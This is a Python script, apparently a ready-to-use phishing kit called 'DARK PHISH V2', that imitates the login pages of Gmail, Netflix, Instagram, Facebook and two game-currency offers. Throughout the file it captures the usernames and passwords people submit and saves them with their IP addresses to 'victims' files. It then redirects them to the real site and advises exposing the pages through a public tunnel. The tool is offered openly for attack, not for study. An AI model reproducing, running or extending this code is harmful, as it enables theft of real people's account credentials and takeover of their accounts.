import os
import threading
import sys
from flask import Flask, request, redirect
from datetime import datetime


try:
    from pyfiglet import figlet_format
except ImportError:
    print("\033[91m[!] pyfiglet not installed. Run: pip install pyfiglet\033[0m")
    sys.exit(1)

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
N = '\033[0m'

app = Flask(__name__)
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear()
    try:
        banner = figlet_format("DARK PHISH V2")
        print(f"{R}{banner}{N}")
    except:
        print(f"{R}DARK PHISH V2 - TEAM DARK\033[0m")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"{G}       ULTRA DANGEROUS PHISHING TOOL | @dark_exploit_")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{N}")

def generate_html(title, logo_url, username_placeholder, background_color, button_color, extra_fields=""):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{title}</title>
  <style>
    body {{background: {background_color};font-family: 'Segoe UI', Arial;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}}
    .container {{background: #fff;padding: 40px;border-radius: 15px;box-shadow: 0 0 25px rgba(0,0,0,0.5);text-align: center;width: 90%;max-width: 450px;animation: fadeIn 1s;}}
    @keyframes fadeIn {{from {{opacity:0;transform:translateY(-30px)}} to {{opacity:1;transform:translateY(0)}}}}
    img {{width: 90px;margin-bottom: 20px;}}
    input {{width: 90%;padding: 15px;margin: 12px 0;border-radius: 10px;border: 1px solid #ddd;font-size: 16px;}}
    input:focus {{border-color: {button_color};}}
    button {{width: 95%;padding: 15px;background: {button_color};color: white;border: none;border-radius: 10px;font-size: 16px;cursor: pointer;}}
    button:hover {{background: #333;transform: scale(1.03);}}
    .secure {{font-size: 12px;color: #666;margin-top: 20px;}}
  </style>
</head>
<body>
  <div class="container">
    <img src="{logo_url}" alt="Logo">
    <h2>{title}</h2>
    <form method="POST">
      <input type="text" name="username" placeholder="{username_placeholder}" required>
      <input type="password" name="password" placeholder="Password" required>
      {extra_fields}
      <button type="submit">Login Now</button>
    </form>
    <div class="secure">🔒 Secure Connection | Your data is protected</div>
  </div>
</body>
</html>"""


platforms = {
    "Gmail": {"redirect": "https://mail.google.com", "placeholder": "Email or Phone", "html": generate_html("Gmail Login", "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico", "Email or Phone", "#f8f9fa", "#4285f4")},
    "Free Fire - Diamonds": {"redirect": "https://freefiremobile.com", "placeholder": "Player ID", "html": generate_html("Free Fire Diamonds", "https://cdn-icons-png.flaticon.com/512/831/831276.png", "Player ID", "#000", "#ff4500", '<input type="number" name="extra" placeholder="Diamond Amount" required>')},
    "BGMI - Free UC": {"redirect": "https://battlegroundsmobileindia.com", "placeholder": "BGMI ID", "html": generate_html("BGMI UC Generator", "https://cdn-icons-png.flaticon.com/512/732/732228.png", "BGMI ID", "#1c2526", "#ffca28", '<input type="number" name="extra" placeholder="UC Amount" required>')},
    "Netflix": {"redirect": "https://netflix.com", "placeholder": "Email or Phone", "html": generate_html("Netflix Login", "https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png", "Email or Phone", "#141414", "#e50914")},
    "Instagram": {"redirect": "https://instagram.com", "placeholder": "Username", "html": generate_html("Instagram Login", "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png", "Username", "#fafafa", "#e1306c")},
    "Facebook": {"redirect": "https://facebook.com", "placeholder": "Email or Mobile", "html": generate_html("Facebook Login", "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico", "Email or Mobile", "#f0f2f5", "#1877f2")},
    # Add baaki sab platforms yaha paste kar dena apne purane script se
}

def run_phishing(platform_data, port, platform_name):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    victim_file = f"victims_{platform_name.replace(' ', '_')}_{timestamp}.txt"

    @app.route("/", methods=["GET", "POST"])
    def login():
        if request.method == "POST":
            username = request.form.get("username", "N/A")
            password = request.form.get("password", "N/A")
            extra = request.form.get("extra", "N/A")
            ip = request.remote_addr
            ua = request.headers.get('User-Agent', 'Unknown')

            log = f"[{datetime.now().strftime('%H:%M:%S')}] VICTIM | {platform_name} | {username}:{password} | Extra: {extra} | IP: {ip}"
            print(f"{G}[+] {log}{N}")

            with open(victim_file, "a", encoding="utf-8") as f:
                f.write(log + "\n")

            return redirect(platform_data["redirect"])

        return platform_data["html"]

    try:
        app.run(host="0.0.0.0", port=port, threaded=True)
    except OSError as e:
        print(f"{R}[!] Port {port} already in use or permission denied! Try another port.{N}")
        sys.exit(1)

def main():
    show_banner()

    print(f"{Y}Select Target Platform:{N}")
    keys = list(platforms.keys())
    for i, k in enumerate(keys, 1):
        print(f"{C}[{i}] {k}{N}")

    try:
        choice = int(input(f"\n{Y}Enter Choice: {N}")) - 1
        selected = platforms[keys[choice]]
        name = keys[choice]
    except:
        print(f"{R}[!] Invalid choice bro!{N}")
        return

    port = input(f"{C}Port (default 5000): {N}").strip() or "5000"

    clear()
    print(f"{G}[+] Starting DARK PHISH V2 for: {name}{N}")
    print(f"{B}[+] Local: http://localhost:{port}{N}")
    print(f"{Y}[+] Tunnel Command → cloudflared tunnel --url http://localhost:{port}{N}\n")
    print(f"{P}[!] Waiting for victims... Logs saved in current folder.{N}")

    threading.Thread(target=run_phishing, args=(selected, int(port), name), daemon=True).start()

    
    try:
        while True:
            pass
        # input() se better hai infinite loop
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped by user. Stay dark! 🖤{N}")

if __name__ == "__main__":
    main()
